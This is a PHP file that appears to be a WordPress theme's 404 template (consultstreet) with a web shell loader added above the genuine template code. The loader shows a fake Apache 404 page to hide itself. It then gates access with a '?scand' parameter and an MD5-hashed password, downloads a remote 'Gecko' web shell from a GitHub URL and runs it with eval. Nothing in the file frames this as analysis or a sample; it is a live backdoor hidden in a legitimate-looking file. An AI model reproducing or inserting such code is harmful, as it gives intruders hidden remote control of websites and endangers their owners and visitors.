<?php
session_start();

/**
 * Tambahan: Fungsi untuk menampilkan pesan 404 Not Found
 */
function show_404() {
    $server_name = $_SERVER['SERVER_NAME']; // Mendapatkan nama server
    $server_port = $_SERVER['SERVER_PORT']; // Mendapatkan port server
    $requested_url = $_SERVER['REQUEST_URI']; // Mendapatkan URL yang diminta
    
    // Menampilkan pesan HTML 404 Not Found
    echo <<<HTML
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL $requested_url was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at $server_name Port $server_port</address>
</body>
</html>
HTML;
    exit; // Menghentikan eksekusi skrip
}

// Tambahan: Batasi akses hanya jika ?scand ada atau sesi login sudah dibuat
if (!isset($_GET['scand']) && !isset($_SESSION['logged_in'])) {
    show_404(); // Tampilkan pesan 404 jika ?scand tidak ada dan belum login
}

/**
 * Disable error reporting
 * 
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['SAP'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = 'e00b29d5b34c3f78df09d45921c9ec47'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Scandalaus Webshell Company<3</title>
    </head>
    <body>
        <center>
        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjXKcyzlN7lQBU_lNxNB9FuVv7Di_edVzyIenWc_yGDNQ_VAyWOxhR0gPpRj4VEFxP-Cvwh4QKcQ34NdXWDqOpJvW7Nu33Z5UbEjitGogPNBkztNN91yJykYu2ZcN5CEl8SyGfzc0JV-w6HZiYZgnzedNV4SUtHNPTkC9kbrWjuzGBKYFk616o6ArHuVNE=w546-h128" />
        <body style="background-color:black;">
        <form method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Touch Me!">
        </form>
        </center>
    </body>
    </html>
    <?php
}
?>
<?php
/**
 * The template for displaying 404 pages (not found) 
 *
 * @link    https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package consultstreet
 */

get_header();
get_template_part('template-parts/site','breadcrumb');
?>
	<!-- 404 Errror -->
	<section class="theme-error-page">
		<div class="container">			
			<div class="row">
				<div class="col-lg-12 col-sm-12">
					<div class="text-center">
						<h2 class="error-title">4<b>0</b>4</h2>
						<h3 class="error-sub-title"><?php esc_html_e("OOPS, SORRY WE CAN'T FIND THAT PAGE !",'consultstreet');?></h3>
						<div class="mx-auto pt-4">
							<a href="<?php echo esc_url(home_url());?>" class="btn-small btn-border"><i class="fa fa-arrow-left pr-2"></i><?php esc_html_e('Go Back Now','consultstreet');?></a>
						</div>
					</div>
				</div>
			</div>			
		</div>
	</section>
	<!-- /End of 404 Errror -->
<?php
get_footer();